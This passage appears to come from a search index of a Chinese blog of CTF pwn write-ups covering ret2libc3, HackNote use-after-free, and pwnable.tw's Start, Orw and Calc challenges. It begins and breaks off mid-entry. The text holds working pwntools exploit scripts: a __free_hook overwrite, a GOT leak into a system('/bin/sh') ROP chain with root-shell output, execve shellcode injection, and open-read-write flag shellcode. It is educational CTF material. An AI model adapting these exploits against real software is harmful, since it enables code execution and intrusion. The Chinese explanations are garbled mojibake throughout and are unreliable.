system_addr = libcbase + self.libc.symbols[\u0026#34;system\u0026#34;]  print \u0026#34;\u0026#39;/bin/sh\u0026#39; address: %x\u0026#34; % bin_sh_addr  print \u0026#34;_free_hook address: %x\u0026#34; % free_hook_addr  print \u0026#34;system address: %x\u0026#34; % system_addr  self.create(0x20, \u0026#34;/bin/sh\u0026#34;, 0x20, \u0026#34;/bin/sh\u0026#34;) # 7  self.write_to(free_hook_addr, p64(system_addr))   # todo: get shell  self.p.sendline(\u0026#34;2\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, \u0026#34;7\u0026#34;)  self.p.interactive()   if __name__ == \u0026#34;__main__\u0026#34;:  c = Challenge()  c.pwn() "},{"id":160,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/ret2libc3/","title":"Ret2libc3","section":"ctf-wiki","content":"ret2libc #  ä¿æŠ¤ç­‰çº§ #  é¦–å…ˆæ£€æŸ¥ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec ret2libc3 [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/ret2libc3/ret2libc3\u0026#39;  Arch: i386-32-little  RELRO: Partial RELRO  Stack: No canary found  NX: NX enabled  PIE: No PIE (0x8048000) å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå¼€å¯äº†éƒ¨åˆ†åªè¯»å’Œæ ˆæº¢å‡ºä¿æŠ¤çš„ç¨‹åºã€‚\nç¨‹åºé€»è¾‘ #  åœ¨ Ida Pro ä¸­æ‰“å¼€å³å¯çœ‹åˆ° main å‡½æ•°çš„ä¼ªä»£ç ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  char s; // [esp+1Ch] [ebp-64h]   setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;);  printf(\u0026#34;Can you find it !?\u0026#34;);  gets(\u0026amp;s);  return 0; } å¯è§è¿™æ˜¯ä¸€ä¸ªç›¸å½“æ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚0x64 ä¸ªå­—èŠ‚å°±èƒ½è¦†ç›–åˆ°åŸ EBPã€0x68 å°±èƒ½è¦†ç›–åˆ°è¿”å›åœ°å€ã€‚\nåˆ©ç”¨ #  æŸ¥æ‰¾å­—ç¬¦ä¸²å’Œ system å‡½æ•°ä¹‹åå‘ç°éƒ½æ²¡æ‰¾åˆ°ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å¾—åˆ° system å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ\n  system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚\n  æ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“ libc ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„ libcã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚\n  é‚£ä¹ˆå¦‚ä½•å¾—åˆ° libc ä¸­çš„æŸä¸ªå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ\n æˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚ å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ï¼Œé€šå¸¸é€‰å–çš„å‡½æ•°æ˜¯ __libc_start_mainï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ç¨‹åºæœ€åˆè¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚  PostScript: å…³äº PLT è¡¨ä¸ GOT è¡¨çš„å…³ç³»å¯ä»¥å‚è€ƒ LIEF\nleak_libc_main #  æˆ‘ä»¬å°†æ§åˆ¶ main å‡½æ•°æº¢å‡ºåï¼Œå…¶æ ˆå¸§å½¢æˆä¸‹é¢çš„å½¢å¼ï¼š\n +----------------+ | | 0x64 | local variable |-----\u0026gt; \u0026#39;A\u0026#39;*0x64 | | +----------------+ 0x4 | previous $ebp |-----\u0026gt; \u0026#39;A\u0026#39;* 0x4 +----------------+ 0x4 | return address |-----\u0026gt; \u0026#34;puts\u0026#34; address +----------------+ ------\u0026gt; \u0026#34;main\u0026#34; address ------\u0026gt; .got.plt:\u0026#34;__start_libc_main\u0026#34; å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯è¿™æ ·ä¸€ä¸ªå‡½æ•° puts(\u0026quot;__start_libc_main\u0026quot;)ã€‚\nget_shell #  å› ä¸ºä¸Šé¢çš„çš„æ ˆå¸§æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ main å‡½æ•°ï¼Œç»è¿‡ä¹‹å‰çš„æ³„éœ²æˆ‘ä»¬å¯ä»¥å¾—åˆ° libc çš„åŠ è½½åŸºåœ°å€ï¼Œå› æ­¤å¯ä»¥å¾—åˆ° system çš„åœ°å€ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‹¿åˆ° shellï¼š\n +----------------+ | | 0x64 | local variable ------\u0026gt; \u0026#39;A\u0026#39;*0x64 | | +----------------+ 0x4 | previous $ebp ------\u0026gt; \u0026#39;A\u0026#39;* 0x4 +----------------+ 0x4 | return address ------\u0026gt; \u0026#34;system\u0026#34; address +----------------+ ------\u0026gt; \u0026#39;A\u0026#39;* 0x4 ------\u0026gt; \u0026#34;/bin/sh\u0026#34; address å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯è¿™æ ·ä¸€ä¸ªå‡½æ•° system(\u0026quot;/bin/sh\u0026quot;)ã€‚\nè„šæœ¬ #  #!/usr/bin/env python2 # coding=utf-8 from pwn import *   class Challenge:  libc_main_addr = 0x1AA50  libc_system_addr = 0x3E9E0  libc_binsh_addr = 0x17EAAA   def __init__(self):  self.p = process([\u0026#34;./ret2libc3\u0026#34;])  self.elf = ELF(\u0026#34;./ret2libc3\u0026#34;)   def leak_libc_main(self):  puts_addr = self.elf.plt[\u0026#34;puts\u0026#34;]  libc_main_addr = self.elf.got[\u0026#34;__libc_start_main\u0026#34;]  main_symbol = self.elf.symbols[\u0026#34;main\u0026#34;]  # todo æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ˜¯ 0x70 çš„åç§»ï¼ŒæŒ‰åæ±‡ç¼–ç»“æœåº”è¯¥æ˜¯ 0x68 æ‰å¯¹ã€‚æ ˆç»“æ„ï¼š  # _puts åœ°å€(ç¬¬ä¸€æ¬¡ main è¿”å›åœ°å€)==\u0026gt;_puts è¿”å›åœ°å€(ç¬¬äºŒæ¬¡ main åœ°å€)==\u0026gt;_puts å‚æ•°(got[\u0026#34;libc_main\u0026#34;])  payload = flat([\u0026#39;A\u0026#39; * (0x6c + 0x4), puts_addr, main_symbol, libc_main_addr])  self.p.recvuntil(\u0026#34;Can you find it !?\u0026#34;)  self.p.sendline(payload)  self.leak_main_addr = u32(self.p.recv()[:4])  print(\u0026#34;__libc_start_main: %s\u0026#34; % hex(self.libc_main_addr))   def get_libc_offset(self):  self.libc_base = self.leak_main_addr - self.libc_main_addr  print(\u0026#34;libc offset: %s\u0026#34; % hex(self.libc_base))   def get_shell(self):  system_addr = self.libc_base + self.libc_system_addr  bin_sh_addr = self.libc_base + self.libc_binsh_addr  payload = flat([\u0026#34;A\u0026#34; * (0x64 + 0x4), system_addr, \u0026#34;A\u0026#34; * 0x4, bin_sh_addr])  self.p.sendline(payload)  self.p.interactive()   def pwn(self):  self.leak_libc_main()  self.get_libc_offset()  self.get_shell()  self.p.wait_for_close()   if __name__ == \u0026#34;__main__\u0026#34;:  c = Challenge()  c.pwn() æ‰§è¡Œç»“æœï¼š\n$ python exp.py [+] Starting local process \u0026#39;./ret2libc3\u0026#39;: pid 6456 [*] \u0026#39;/tmp/pycharm_project_477/ret2libc3\u0026#39;  Arch: i386-32-little  RELRO: Partial RELRO  Stack: No canary found  NX: NX enabled  PIE: No PIE (0x8048000) __libc_start_main: 0x1aa50 libc offset: 0xf7d55000 [*] Switching to interactive mode $ whoami root "},{"id":161,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/useafterfree/","title":"Useafterfree","section":"ctf-wiki","content":" é¢˜ç›®ï¼šHitcon Training lab10\n Use After Free #  æ–‡ä»¶ä¿¡æ¯ #  æ£€æŸ¥æ–‡ä»¶å®‰å…¨æ€§ï¼š\n$ checksec ./hacknote [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/useafterfree/hacknote\u0026#39;  Arch: i386-32-little  RELRO: Partial RELRO  Stack: Canary found  NX: NX enabled  PIE: No PIE (0x8048000) ç¨‹åºæ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–ï¼Œæœ‰æ ˆä¿æŠ¤å’Œå †æ ˆä¸å¯æ‰§è¡Œã€‚\nç¨‹åºé€»è¾‘ #  è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­å­˜åœ¨å‡½æ•°çš„è°ƒå¼ä¿¡æ¯ï¼Œmain å‡½æ•°å°±æ˜¯æ‰“å°èœå•ï¼Œç„¶åæ‰§è¡Œå‡ ä¸ªé€‰é¡¹çš„å¸¸è§„å¥—è·¯ã€‚\nmenu #  int menu() {  puts(\u0026#34;----------------------\u0026#34;);  puts(\u0026#34; HackNote \u0026#34;);  puts(\u0026#34;----------------------\u0026#34;);  puts(\u0026#34; 1. Add note \u0026#34;);  puts(\u0026#34; 2. Delete note \u0026#34;);  puts(\u0026#34; 3. Print note \u0026#34;);  puts(\u0026#34; 4. Exit \u0026#34;);  puts(\u0026#34;----------------------\u0026#34;);  return printf(\u0026#34;Your choice :\u0026#34;); } å¯è§è¾“å‡ºå››ä¸ªæ•°å­—å¯¹åº”çš„åŠŸèƒ½ã€‚\nadd_note #  ç®€å•çš„åˆ†é…åœ°å€çš„åŠŸèƒ½ã€‚é€šè¿‡é˜…è¯»æºç å®ç°é€»è¾‘ï¼Œå­˜å‚¨ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\nstruct Note{  void (*func_ptr)(int);\t// æŒ‡å‘äº† `print_note_content` çš„å‡½æ•°åœ°å€  char *buffer;\t// ç”¨æˆ·é€šè¿‡æŒ‡å®šä¸€ä¸ª `size` è¯»å…¥çš„å†…å®¹ };  Note notlist[5]; del_note #  åˆ é™¤ç¬”è®°ï¼š\nunsigned int del_note() {  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]   v3 = __readgsdword(0x14u);  printf(\u0026#34;Index :\u0026#34;);  read(0, \u0026amp;buf, 4u);  v1 = atoi(\u0026amp;buf);  if ( v1 \u0026lt; 0 || v1 \u0026gt;= count )  {  puts(\u0026#34;Out of bound!\u0026#34;);  _exit(0);  }  if ( notelist[v1] )  {  free(*((void **)notelist[v1] + 1));  free(notelist[v1]);  puts(\u0026#34;Success\u0026#34;);  }  return __readgsdword(0x14u) ^ v3; } éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„ç¬”è®°å†…å­˜è¢«é‡Šæ”¾åï¼Œå¹¶æ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆã€‚è¿™æœ‰å¯èƒ½å¯¼è‡´ UAF æ¼æ´æˆ– Double Free æ¼æ´ã€‚\nprint_note #  å› ä¸ºæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆä¼šå¯¼è‡´çš„ UAF æ¼æ´å³åœ¨æ­¤å¤„å‘ç”Ÿã€‚\nunsigned int print_note() {  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]   v3 = __readgsdword(0x14u);  printf(\u0026#34;Index :\u0026#34;);  read(0, \u0026amp;buf, 4u);  v1 = atoi(\u0026amp;buf);  if ( v1 \u0026lt; 0 || v1 \u0026gt;= count )  {  puts(\u0026#34;Out of bound!\u0026#34;);  _exit(0);  }  if ( notelist[v1] )  (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);  return __readgsdword(0x14u) ^ v3; } å®ƒçš„ç¨‹åºé€»è¾‘æ˜¯è¯»å…¥ä¸€ä¸ª indexï¼Œè°ƒç”¨å¯¹åº”ä½ç½®ç¬¬ä¸€ä¸ªå†…å®¹å­˜å‚¨çš„ print_note_content å‡½æ•°ï¼Œå°†å†…å®¹æ‰“å°å‡ºæ¥ã€‚\nmagic #  æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ä»å‡½æ•°è¡¨ä¸­è¿˜å¯ä»¥çœ‹åˆ°è¿™æ ·ä¸€ä¸ªæ²¡æœ‰è¢«è°ƒç”¨çš„å‡½æ•°ï¼š\nint magic() {  return system(\u0026#34;cat flag\u0026#34;); } æ®æ­¤æˆ‘ä»¬å°±å¤§æ¦‚å¯ä»¥çŒœæµ‹åˆ°ï¼Œç ´è§£çš„æ€è·¯åº”è¯¥æ˜¯æ‰§è¡Œ magic å‡½æ•°å³å¯ã€‚\næ¼æ´åˆ©ç”¨ #  æ ¹æ®ä¹‹å‰çš„é˜…è¯»æºç å¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ª UAF æ¼æ´ã€‚æˆ‘ä»¬\n"},{"id":162,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/1.start/","title":"1.Start","section":"pwnable","content":" å‚è€ƒèµ„æ–™ï¼š\n å®‰å…¨å®¢ï¼Œå‰å…­é¢˜çš„é¢˜è§£ï¼šhttps://www.anquanke.com/post/id/150359 Linux Syscall Referenceï¼šhttp://syscalls.kernelgrok.com/ Assembly Reference: https://www.felixcloutier.com/x86/   START #  é¦–å…ˆæ£€æŸ¥å®‰å…¨ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec ./start [*] \u0026#39;/mnt/d/program/ctf/pwnable/start/start\u0026#39;  Arch: i386-32-little  RELRO: No RELRO  Stack: No canary found  NX: NX disabled  PIE: No PIE (0x8048000) æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š\n$ objdump -d ./start  ./start: file format elf32-i386   Disassembly of section .text:  08048060 \u0026lt;_start\u0026gt;:  8048060: 54 push %esp  8048061: 68 9d 80 04 08 push $0x804809d  8048066: 31 c0 xor %eax,%eax  8048068: 31 db xor %ebx,%ebx  804806a: 31 c9 xor %ecx,%ecx  804806c: 31 d2 xor %edx,%edx  804806e: 68 43 54 46 3a push $0x3a465443  8048073: 68 74 68 65 20 push $0x20656874  8048078: 68 61 72 74 20 push $0x20747261  804807d: 68 73 20 73 74 push $0x74732073  8048082: 68 4c 65 74 27 push $0x2774654c  8048087: 89 e1 mov %esp,%ecx  8048089: b2 14 mov $0x14,%dl  804808b: b3 01 mov $0x1,%bl  804808d: b0 04 mov $0x4,%al  804808f: cd 80 int $0x80  8048091: 31 db xor %ebx,%ebx  8048093: b2 3c mov $0x3c,%dl  8048095: b0 03 mov $0x3,%al  8048097: cd 80 int $0x80  8048099: 83 c4 14 add $0x14,%esp  804809c: c3 ret  0804809d \u0026lt;_exit\u0026gt;:  804809d: 5c pop %esp  804809e: 31 c0 xor %eax,%eax  80480a0: 40 inc %eax  80480a1: cd 80 int $0x80 æˆ‘ä»¬åˆ†æè¿™ä¸ªæ±‡ç¼–ä»£ç çš„ç»“æ„ï¼š\n  è§‚å¯Ÿè¿™ä¸ªå‡½æ•°çš„å¼€å§‹æ®µï¼Œå®ƒå¹¶æ²¡æœ‰è¯¸å¦‚æŠ¼å…¥ ebp ç­‰æ ˆæ“ä½œã€‚ä¸€ç›´åˆ° 0x804806c è¿™ä¸ªåœ°å€ï¼Œå‡½æ•°åšäº†ä¸€äº›åˆå§‹åŒ–çš„äº‹æƒ…ï¼Œå¹¶ä¸”æŠŠå››ä¸ªå¯„å­˜å™¨ç½® 0ï¼›\n  0x804806e - 0x8048082 è¿™æ®µåœ°å€å‘æ ˆä¸­å­˜å…¥äº†å­—ç¬¦ä¸²ï¼ˆå°ç«¯å­˜å‚¨ã€æ ˆä»é«˜åˆ°ä½å¢é•¿ï¼‰ï¼š\nprint(b\u0026#39;\\x4c\\x65\\x74\\x27\\x73\\x20\\x73\\x74\\x61\\x72\\x74\\x20\\x74\\x68\\x65\\x20\\x43\\x54\\x46\\x3a\u0026#39;) # b\u0026#34;Let\u0026#39;s start the CTF:\u0026#34;   0x8048087 - 0x804808f è¿™æ®µä»£ç è°ƒç”¨äº† int 80h ä¸­æ–­ï¼ŒæŸ¥è¯¢ç½‘å€ï¼ŒçŸ¥é“ 4 å·ä¸­æ–­æ˜¯ sys_write()ï¼š\nsys_write(unsigned int fd = 1, const char __user *buf = $esp, int count = 0x14)   0x8048091 - 0x8048097 è¿™æ®µä»£ç è°ƒç”¨äº† int 80h çš„ 3 å·ä¸­æ–­ sys_read()ï¼š\nsys_read(unsigned int fd = 0, const char __user *buf = $esp, int count = 0x3c)   ç„¶åç¨‹åºåœ¨ 0x8048099 å°†æ ˆé¡¶æŒ‡é’ˆä¸Šç§»äº† 0x14 ä¸ªå­—èŠ‚ã€‚\n  ç„¶åç¨‹åºæ‰§è¡Œ ret æŒ‡ä»¤ï¼ˆret æŒ‡ä»¤åªåšä¸€ä»¶äº‹æƒ…ï¼Œå°†ç¨‹åºçš„æ‰§è¡Œæƒäº¤ç»™æ ˆé¡¶ esp æŒ‡å‘çš„åœ°å€ï¼‰ã€‚\n  exp.py å¦‚ä¸‹ï¼š\n#!/usr/bin/env python #coding=utf-8 from pwn import *  class Challenge:  def __init__(self, local=True):  self.local = local  if local:  self.p = process([\u0026#39;./start\u0026#39;])  else:  self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10000)   def gdb(self):  assert self.local  context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]  gdb.attach(proc.pidof(self.p)[0])   def leak_esp(self):  self.p.recvuntil(\u0026#39;:\u0026#39;)  payload1 = \u0026#39;a\u0026#39;*0x14 + p32(0x8048087)  self.p.send(payload1)  self.esp = self.p.recv(4)  print(\u0026#34;get esp:\u0026#34;, list(self.esp))   def inject_shellcode(self):  shellcode = asm(\u0026#39;\u0026#39;.join([  \u0026#34;push %d\\n\u0026#34; % u32(\u0026#34;/sh\\0\u0026#34;),  \u0026#34;push %d\\n\u0026#34; % u32(\u0026#34;/bin\u0026#34;),  \u0026#34;mov ebx,esp\\n\u0026#34;, # EBX æŒ‡å‘æ ˆé¡¶  \u0026#34;xor edx,edx\\n\u0026#34;, # ç½®é›¶ EDX  \u0026#34;xor ecx,ecx\\n\u0026#34;, # ç½®é›¶ ECX  \u0026#34;mov eax,0xb\\n\u0026#34;, # æŒ‡æ˜ä¸­æ–­è¿›ç¨‹ sys_execute  \u0026#34;int 0x80\u0026#34;  ]))  assert len(shellcode) \u0026lt; 0x3c - 0x14 - 0x4  payload2 = \u0026#39;a\u0026#39;*0x14 + p32(u32(self.esp) + 0x14) + shellcode  self.p.send(payload2)   def get_shell(self):  self.p.interactive()   def pwn(self):  print(\u0026#34;----------begin-----------\u0026#34;)  self.leak_esp()  self.inject_shellcode()  self.get_shell()  self.p.wait_for_close()  print(\u0026#34;-----------end------------\u0026#34;)  if __name__ == \u0026#34;__main__\u0026#34;:  s = Challenge(False)  s.pwn() "},{"id":163,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/2.orw/","title":"2.Orw","section":"pwnable","content":" å‚è€ƒèµ„æ–™ï¼š\n https://www.anquanke.com/post/id/150359   ORW #  é¦–å…ˆæ£€æŸ¥å®‰å…¨ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec orw [*] \u0026#39;/media/data/program/ctf/pwnable/orw/orw\u0026#39;  Arch: i386-32-little  RELRO: Partial RELRO  Stack: Canary found  NX: NX disabled  PIE: No PIE (0x8048000)  RWX: Has RWX segments å¯ä»¥çœ‹åˆ°è¿™ä¸ªç¨‹åºå¼€å¯äº†ä»¥ä¸‹ä¿æŠ¤æœºåˆ¶ï¼š\n Canary å¼€å¯ï¼Œéƒ¨åˆ† RELOADï¼Œè¿˜æœ‰ RWX è¯»å†™æ‰§è¡Œæ®µã€‚  åœ¨ gdb é‡Œé¢å¯ä»¥æŸ¥çœ‹ main å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼š\n(gdb) info functions\rAll defined functions:\rNon-debugging symbols:\r0x08048330 _init\r0x08048370 read@plt\r0x08048380 printf@plt\r0x08048390 __stack_chk_fail@plt\r0x080483a0 __libc_start_main@plt\r0x080483b0 prctl@plt\r0x080483c0 __gmon_start__@plt\r0x080483d0 _start\r0x08048400 __x86.get_pc_thunk.bx\r0x08048410 deregister_tm_clones\r0x08048440 register_tm_clones\r0x08048480 __do_global_dtors_aux\r0x080484a0 frame_dummy\r0x080484cb orw_seccomp\r0x08048548 main\r0x080485a0 __libc_csu_init\r0x08048600 __libc_csu_fini\r0x08048604 _fini\r(gdb) disas main\rDump of assembler code for function main:\r0x08048548 \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx\r0x0804854c \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp\r0x0804854f \u0026lt;+7\u0026gt;: pushl -0x4(%ecx)\r0x08048552 \u0026lt;+10\u0026gt;: push %ebp\r0x08048553 \u0026lt;+11\u0026gt;: mov %esp,%ebp\r0x08048555 \u0026lt;+13\u0026gt;: push %ecx\r0x08048556 \u0026lt;+14\u0026gt;: sub $0x4,%esp\r0x08048559 \u0026lt;+17\u0026gt;: call 0x80484cb \u0026lt;orw_seccomp\u0026gt;\r0x0804855e \u0026lt;+22\u0026gt;: sub $0xc,%esp\r0x08048561 \u0026lt;+25\u0026gt;: push $0x80486a0\r0x08048566 \u0026lt;+30\u0026gt;: call 0x8048380 \u0026lt;printf@plt\u0026gt;\r0x0804856b \u0026lt;+35\u0026gt;: add $0x10,%esp\r0x0804856e \u0026lt;+38\u0026gt;: sub $0x4,%esp\r0x08048571 \u0026lt;+41\u0026gt;: push $0xc8\r0x08048576 \u0026lt;+46\u0026gt;: push $0x804a060\r0x0804857b \u0026lt;+51\u0026gt;: push $0x0\r0x0804857d \u0026lt;+53\u0026gt;: call 0x8048370 \u0026lt;read@plt\u0026gt;\r0x08048582 \u0026lt;+58\u0026gt;: add $0x10,%esp\r0x08048585 \u0026lt;+61\u0026gt;: mov $0x804a060,%eax\r0x0804858a \u0026lt;+66\u0026gt;: call *%eax\r0x0804858c \u0026lt;+68\u0026gt;: mov $0x0,%eax\r0x08048591 \u0026lt;+73\u0026gt;: mov -0x4(%ebp),%ecx\r0x08048594 \u0026lt;+76\u0026gt;: leave 0x08048595 \u0026lt;+77\u0026gt;: lea -0x4(%ecx),%esp\r0x08048598 \u0026lt;+80\u0026gt;: ret End of assembler dump. å¯è§è¿™æ˜¯ä¸€ä¸ªæœ‰ç€å®Œæ•´ç¼–è¯‘ç»“æ„çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸»è¦çœ‹ main å‡½æ•°ä¸­çš„ä¸»è¦åŠŸèƒ½ï¼š\n  åœ¨æ ˆé¡¶æ˜¯ %ecx = 0x4(%esp) çš„æƒ…å†µä¸‹ï¼Œåœ¨ *main+17 è¡Œè°ƒç”¨äº†å‡½æ•° orw_seccompï¼›\n  ä¼ å…¥å­—ç¬¦ä¸² 0x80486a0ï¼Œè°ƒç”¨ printf@plt å‡½æ•°ã€‚å¯ä»¥åœ¨ gdb ä¸­æŸ¥çœ‹å­—ç¬¦ä¸²çš„å†…å®¹ï¼š\n(gdb) x /s 0x80486a0\r0x80486a0: \u0026#34;Give my your shellcode:\u0026#34;   åœ¨ *main+41 ~ *main+51 è¡Œï¼Œå‡½æ•°é€šè¿‡ä¸‰ä¸ªå‚æ•°è°ƒç”¨äº† read@plt å‡½æ•°ï¼š\nread(0x0, 0x804a060, 0xc8)   åœ¨ *main+61 ~ *main+66 è¡Œï¼Œå‡½æ•°ç›´æ¥å°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºä¸€ä¸ªå‡½æ•°è¿›è¡Œäº†è°ƒç”¨ã€‚\n  å› æ­¤ç¨‹åºçš„é€»è¾‘å°±æ˜¯ï¼šä¼ å…¥ä¸€ä¸ª shellcode åè¿™ä¸ª shellcode ä¼šè¢«æ‰§è¡Œã€‚æˆ‘ä»¬å°è¯•ç›´æ¥æŒ‰ç…§é¢˜ç›®çš„æç¤ºè¿›è¡Œç¼–å†™ï¼ˆflag åœ¨æ–‡ä»¶ /home/orw/flag ä¸­ï¼Œå¹¶ä¸”åªå…è®¸ä½¿ç”¨ open,read,write ä¸‰ä¸ªå‡½æ•°ï¼‰ï¼š\n#!/usr/bin/env python #coding=utf-8 from pwn import *  class Challenge:  def __init__(self, local=True):  self.local = local  if local:  self.p = process([\u0026#39;./orw\u0026#39;])  else:  self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10001)   def gdb(self):  assert self.local  context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]  gdb.attach(proc.pidof(self.p)[0])   def inject_shellcode(self):  self.p.recvuntil(\u0026#34;:\u0026#34;)  shellcode = asm(\u0026#34;\\n\u0026#34;.join([  shellcraft.i386.pushstr(\u0026#34;/home/orw/flag\u0026#34;),  shellcraft.i386.linux.syscall(\u0026#34;SYS_open\u0026#34;, \u0026#39;esp\u0026#39;),  shellcraft.i386.linux.syscall(\u0026#34;SYS_read\u0026#34;, \u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0x30),  shellcraft.i386.linux.syscall(\u0026#34;SYS_write\u0026#34;, 1, \u0026#39;esp\u0026#39;, 0x30)  ]))  assert len(shellcode) \u0026lt; 0xc8  self.p.send(shellcode)   def pwn(self):  self.inject_shellcode()  self.p.interactive()  self.p.wait_for_close()   if __name__ == \u0026#34;__main__\u0026#34;:  c = Challenge(False)  c.pwn() ä¹Ÿå¯ä»¥è·Ÿ start ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ 80 ä¸­æ–­è°ƒç”¨è¿™ä¸‰ä¸ªå‡½æ•°ã€‚\n"},{"id":164,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/3.calc/","title":"3.Calc","section":"pwnable","content":"CALC #  ä¿æŠ¤ç­‰çº§ #  é¦–å…ˆæ£€æŸ¥å®‰å…¨ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec calc [*] \u0026#39;/media/data/program/ctf/pwnable/calc/calc\u0026#39;  Arch: i386-32-little  RELRO: Partial RELRO  Stack: Canary found  NX: NX enabled  PIE: No PIE (0x8048000) ç¨‹åºå¼€å¯äº† NX ä¿æŠ¤ï¼Œä¸èƒ½æ‰§è¡Œæ ˆä»£ç ã€‚æˆ‘ä»¬å†çœ‹ç¨‹åºçš„é“¾æ¥æ–¹å¼ï¼š\n$ objdump -R calc  calcï¼š æ–‡ä»¶æ ¼å¼ elf32-i386  objdump: calcï¼šä¸æ˜¯åŠ¨æ€å¯¹è±¡ objdump: calc: invalid operation ç¨‹åºæ˜¯é™æ€é“¾æ¥ã€‚\nç¨‹åºé€»è¾‘ #  main #  åœ¨ gdb ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªç¨‹åºçš„é€»è¾‘ç»“æ„è¿‡äºå¤æ‚ï¼Œæˆ‘ä»¬ä½¿ç”¨ Ida Pro æ‰“å¼€ã€‚é¦–å…ˆçœ‹ main å‡½æ•°ï¼Œå¯ä»¥åœ¨ Ida Pro ä¸­æŸ¥çœ‹å…¶ä¼ªä»£ç ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) {  ssignal(14, timeout);  alarm(60);  puts(\u0026#34;=== Welcome to SECPROG calculator ===\u0026#34;);  fflush(stdout);  calc();  return puts(\u0026#34;Merry Christmas!\u0026#34;); } calc #  æ˜¾ç„¶ calc æ˜¯è¿™ä¸ªç¨‹åºçš„ä¸»å‡½æ•°ï¼š\nunsigned int calc() {  int buffer_len; // [esp+18h] [ebp-5A0h]  int buffer[100]; // [esp+1Ch] [ebp-59Ch]  char expr; // [esp+1ACh] [ebp-40Ch]  unsigned int canary; // [esp+5ACh] [ebp-Ch]   canary = __readgsdword(0x14u);  while ( 1 )  {  bzero(\u0026amp;expr, 0x400u);  if ( !get_expr((int)\u0026amp;expr, 1024) )  break;  init_pool(\u0026amp;buffer_len);  if ( parse_expr((int)\u0026amp;expr, \u0026amp;buffer_len) )  {  printf((const char *)\u0026amp;unk_80BF804, buffer[buffer_len - 1]);  fflush(stdout);  }  }  return __readgsdword(0x14u) ^ canary; } å¹¶ä¸”å¯ä»¥æŸ¥çœ‹å®ƒçš„è°ƒç”¨æ 